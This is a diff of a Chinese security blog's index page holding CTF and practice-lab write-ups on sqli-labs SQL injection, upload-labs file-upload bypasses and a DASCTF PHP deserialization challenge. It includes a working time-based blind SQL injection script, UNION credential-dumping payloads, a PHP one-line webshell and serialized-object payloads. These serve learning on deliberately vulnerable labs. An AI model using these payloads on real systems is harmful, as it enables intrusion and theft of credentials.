+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">	&#96;&#96;&#96;id&#x3D;1&#39; and if(ascii(substr((select password from users limit 2,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) %23&#96;&#96;&#96;</span><br><span class="line">	&#96;&#96;&#96;limit i,n&#96;&#96;&#96;的含义是，从第i行开始截取，截取n行</span><br><span class="line">	&#96;&#96;&#96;%23&#96;&#96;&#96;是井号，用来注释掉后面的</span><br><span class="line">	但是这是查询所有users表内password列的内容，容易和别的数据库一起查询了，所以最好写成&#96;&#96;&#96;id&#x3D;1&#39; and if(ascii(substr((select password from security.users limit 2,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) %23&#96;&#96;&#96;</span><br><span class="line">8.时间盲注(Less-9,Less-10)</span><br><span class="line">	当不管查没查到数据回显都相同且的时候，布尔盲注就失效了。</span><br><span class="line">	这里可以用时间盲注(必须无论什么时候回显都是一样的)</span><br><span class="line">	&#96;&#96;&#96;id&#x3D;1&#39; and if(ascii(substr((select username from users limit 0,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) %23&#96;&#96;&#96;</span><br><span class="line">	和布尔盲注方法差不多，只不过上一个是依靠字符相同时才返回查询内容，不然返回0让其没有回显。这一个是字符相同时才延时2s，然后根据脚本内置的计时器来判断是否有回显。（这里用了设置超时时间，让延迟时间超过超时时间，如果字符正确就超时了，来确定）</span><br><span class="line">	上脚本：</span><br></pre></td></tr></table></figure>
+<h1 id="coding-utf-8-1"><a href="#coding-utf-8-1" class="headerlink" title="coding=utf-8"></a>coding=utf-8</h1><p>import requests</p>
+<p>url = “<a target="_blank" rel="noopener" href="http://localhost/Less-9/?id=1&#39;">http://localhost/Less-9/?id=1&#39;</a> and “<br>result = ‘’<br>i = 0</p>
+<p>while True:<br>    i = i+1<br>    head = 32<br>    tail = 127<br>    while head &lt; tail:<br>        mid = (tail + head) &gt;&gt;1<br>        #payload = f’if(ascii(substr((select database()),{i},1))&gt;{mid},sleep(2),0) %23’<br>        payload = f’if(ascii(substr((select username from security.users  limit 0,1),{i},1))&gt;{mid},sleep(2),0) %23’<br>        try:<br>            r = requests.get(url+payload,timeout=0.5)<br>            tail = mid<br>        except Exception as e:<br>            head = mid+1</p>
+<pre><code>if head != 32:
+    result += chr(head)
+else:
+    break
+print(result)
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;if(ascii(substr((select username from security.users  limit 0,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) %23&#96;&#96;&#96;中的&#96;&#96;&#96;security.users&#96;&#96;&#96;是库名和表名（是在不行也可以只写表名，查所有叫这个名字的表），&#96;&#96;&#96;limit 0,1&#96;&#96;&#96;的0可以换成别的数，来确定行数</span><br><span class="line"></span><br><span class="line">四类大方法过完后，之后就是一些小方法了</span><br><span class="line"></span><br><span class="line">9.POST传参（Less-11——Less-17）</span><br><span class="line">	没有差别，只是把参数改到post上就行。方法一，burpsuite抓包，数据包的最下面改包。方法二，hackbar打开post（但是这道题有一个坑，hackbar不能传&#96;&#96;&#96;submit&#96;&#96;&#96;为形参的内容，似乎是因为会和headers里的submit冲突，所以要传这类参数的时候只能用burp，或者先用hackbar改一部分，删除submit，然后再用burp抓包，加上submit）</span><br><span class="line">	比如以下查询语句（Less-11）：</span><br></pre></td></tr></table></figure>
+<pre><code>$uname=$_POST[&#39;uname&#39;];
+$passwd=$_POST[&#39;passwd&#39;];
+@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虽然两个参数都要传（前面因为有&#96;&#96;&#96;isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])&#96;&#96;&#96;检验），但是只用改&#96;&#96;&#96;uname&#96;&#96;&#96;这个参数的值就行，然后用&#96;&#96;&#96;--+&#96;&#96;&#96;注释掉后面的内容</span><br><span class="line"></span><br><span class="line">所以post传参举例：</span><br></pre></td></tr></table></figure>
+<pre><code>uname=1&#39; union select group_concat(username),group_concat(password) from users--+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<pre><code>    还有一个注意点就是这里必须让select查出两个参数，多或者少都会报错```The used SELECT statements have a different number of columns```，因为前一个select查了两个值，所以后一个必须也查两个值才能构成union的条件（以前的```*```查了id，username，password三个值，所以要查三个（多余的用1,2,3来补充）
+    然后就是运用不同的闭合方法和注入方法来做题了。
+
+
+
+
+
+
+统计：
+sqlmap能爆出的关卡：
+sqlmap不能爆出的关卡：
+</code></pre>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/27/sqli-labs/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-uploadlabs-3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/27/uploadlabs-3/">uploadlabs-3</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/09/27/uploadlabs-3/" class="archive-article-date">
+  	<time datetime="2021-09-27T13:23:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码解释：<br>trim():去除文件前后的空格，tab等字符<br>deldot():删除文件名末尾的点<br>strrchr($file_name, ‘.’);:截取文件名中点后面的字符串（包括点）<br>strtolower($file_ext); //转换为小写<br>str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p>
+<p>先上传一个php，发现可以构筑数据包，所以是后端检测</p>
+<p>随便上传一个hack.png文件，发现显示的文件路径为<code>upload/202109272127051740.png</code><br>所以文件是通过<code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;  </code>随机生成的文件名</p>
+<p>前文说了，只要是后端检测，我们就不可能在检测之后把被检测的部分改过来了（因为那时候文件已经到了服务器端）</p>
+<p>不过虽然php被禁了，但是能被解析成php代码的文件还有<code>phtml,php3,php4,php5,pht</code>,随便写一个就好了<br>（但是如果使用的是phpstudy，phpstudy这个配置文件把以上后缀都给注释了，所以如果不改的话这一关相当于没有漏洞，修改方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43480081/article/details/102504348%EF%BC%89">https://blog.csdn.net/qq_43480081/article/details/102504348）</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/27/uploadlabs-3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-uploadlabs-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/26/uploadlabs-2/">uploadlabs-2</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/09/26/uploadlabs-2/" class="archive-article-date">
+  	<time datetime="2021-09-26T14:47:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这一次看源代码，已经没有了js脚本，很明显这是一个后端检测，所以前面上传什么都没有问题，会顺利的构筑数据包，等数据包发送后才会被检测。<br>检测的是文件的type，是并不会影响文件属性的参数<br>所以有两种方法：<br>1.上传hack.php，抓包以后把<code>Content-Type</code>改成<code>image/gif</code><br>2.上传hack.png，抓包以后把文件名改成hack.php<br>最后结果：</p>
+<img src="/2021/09/26/uploadlabs-2/1.PNG" class="" title="1.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/26/uploadlabs-2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-uploadlabs-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -192,11 +924,13 @@
 <p>lastIndexOf(“.”)函数的作用是“获取程序后缀”</p>
 <p>虽然给了代码，但是光看这些代码还是不够的，必须要结合html看才行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;上传区&lt;&#x2F;h3&gt;</span><br><span class="line">            &lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;</span><br><span class="line">                &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot;&#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
-<p>在HTML中，我们看见checkFile()函数主要影响的是post时的onsubmit，相当于只有通过check才会构建post包进行上传。<br>这就是俗称的“前端检测”<br>个人认为，与其把“前后端检测”的差别定义为“前端脚本（html）”和“后端脚本（php）”的区别，不如以构建数据包为分界，构建前检测的是“前端”，构建后检测的为“后端”。</p>
+<p>在HTML中，我们看见checkFile()函数主要影响的是post时的onsubmit，相当于只有通过check才会构建post包进行上传。<br>这就是俗称的“前端检测”<br>个人认为，一般来说“前后端检测”的差别定义为“前端脚本（html，js）”和“后端脚本（php）”的区别，感觉也可以以构建数据包为分界，构建前检测的是“前端”，构建后检测的为“后端”。</p>
 <p>既然这是一个前端脚本，那我们的目的只是绕过构筑数据包之前的部分。<br>所以先写一个一句话木马：<code>&lt;?php @system($_POST[&#39;a&#39;]);?&gt;</code><br>然后把文件的后缀改为png<br>上传以后通过burpsuite抓包，将后缀改成php发送</p>
 
 <p>用蚁剑连接成功</p>
 
+
+<p>当然，这既然是前端脚本，而且是js，那就直接“禁用js”就行了</p>
 
       
 
@@ -261,14 +995,14 @@
     </section>
   
   
-    <article id="post-DASCTF秋季挑战赛-hellouser" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-hellouser" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/25/DASCTF%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-hellouser/">DASCTF秋季挑战赛_hellouser</a>
+      <a class="article-title" href="/2021/09/25/hellouser/">DASCTF秋季挑战赛_hellouser</a>
     </h1>
   
 
@@ -276,7 +1010,7 @@
         
 
 
-<a href="/2021/09/25/DASCTF%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-hellouser/" class="archive-article-date">
+<a href="/2021/09/25/hellouser/" class="archive-article-date">
   	<time datetime="2021-09-25T08:38:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-25</time>
 </a>
         
@@ -297,12 +1031,12 @@
 <p>之后就是给$func和$arg赋值，构造可执行函数了<br>这里可以直接参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaolong22333/article/details/115332682">https://blog.csdn.net/xiaolong22333/article/details/115332682</a><br>绕waf可以用get_defined_vars()函数，所以第二个payload为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;var &#x3D;new B();</span><br><span class="line">&#125;</span><br><span class="line">    public $var&#x3D;&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $func&#x3D;&quot;create_function&quot;;</span><br><span class="line">    public $arg&#x3D;&quot;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$bbb &#x3D; new A; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $bbb&#x3D;serialize($bbb);</span><br></pre></td></tr></table></figure>
 <p>获得真正的flag文件名（不愧是套神）</p>
-<img src="/2021/09/25/DASCTF%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-hellouser/1.PNG" class="" title="1.PNG">
+<img src="/2021/09/25/hellouser/1.PNG" class="" title="1.PNG">
 
 <p>然后可以用require代替被waf的include，用base64绕过flag的waf（<code>VHJ1M2ZsYWcucGhw</code>）<br>所以最后的payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">    $this-&gt;var &#x3D;new B();</span><br><span class="line">&#125;</span><br><span class="line">	public $var&#x3D;&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $func&#x3D;&quot;create_function&quot;;</span><br><span class="line">    public $arg&#x3D;&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$bbb &#x3D; new A; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $bbb&#x3D;serialize($bbb);</span><br></pre></td></tr></table></figure>
 <p>得到真正的flag</p>
-<img src="/2021/09/25/DASCTF%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-hellouser/1.PNG" class="" title="1.PNG">
+<img src="/2021/09/25/hellouser/1.PNG" class="" title="1.PNG">
 
 
       
@@ -316,7 +1050,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/25/DASCTF%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-hellouser/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/09/25/hellouser/">展开全文 >></a>
         </p>
       
 
@@ -653,612 +1387,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/08/19/linux%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-闪电十六鞭" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/">bugku-web-闪电十六鞭</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/" class="archive-article-date">
-  	<time datetime="2021-08-12T06:00:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>参考这篇——<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fallingskies/p/14287103.html">https://www.cnblogs.com/fallingskies/p/14287103.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">    $exam &#x3D; &#39;return\&#39;&#39;.sha1(time()).&#39;\&#39;;&#39;;</span><br><span class="line"></span><br><span class="line">    if (!isset($_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">        echo &#39;&lt;a href&#x3D;&quot;.&#x2F;?flag&#x3D;&#39;.$exam.&#39;&quot;&gt;Click here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (strlen($_GET[&#39;flag&#39;]) !&#x3D; strlen($exam)) &#123;</span><br><span class="line">        echo &#39;长度不允许&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (preg_match(&#39;&#x2F;&#96;|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit&#x2F;is&#39;, $_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">        echo &#39;关键字不允许&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (eval($_GET[&#39;flag&#39;]) &#x3D;&#x3D;&#x3D; sha1($flag)) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &#39;马老师发生甚么事了&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
-<p>当没有用GET方法传入flag时，会显示Click here的链接。</p>
-<p>点击链接会用GET方法传入一串字符串$exam，后面是当前时间的一串sha1哈希值。</p>
-<p>判断传入的flag长度与$exam是否相同，不同则显示  长度不允许</p>
-<p>第二个判断过滤了一大堆</p>
-<p>第三个判断传入flag的值等于flag值的哈希值，正确就输出flag。用的是严格的三个等号的比较，我们flag都不知道，哈希值更不可能知道了，==</p>
-<p>但容易发现此处存在任意代码执行漏洞， </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_GET[&#39;flag&#39;])</span><br></pre></td></tr></table></figure>
-
-<p>尝试绕过过滤</p>
-<p>echo被过滤了，用php短标签进行输出</p>
-<p>flag被过滤了，用先赋其他值，再修改的方法绕过</p>
-<p>当php开启短标签后，</p>
-<p>能正常解析类似于这样形式的php文件： phpinfo() ?&gt;</p>
-<p>并且可以使用<?=$a?>的形式输出</p>
-<p>$exam字符串长度为49</p>
-<p>为了使payload长度与$exam长度相等，在代码间加入无意义的语句。</p>
-<p>构造payload：$a=blag;$a{0}=f;111111111111111111111;?&gt;<?=$$a;?></p>
-<p>成功得到flag</p>
-<img src="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
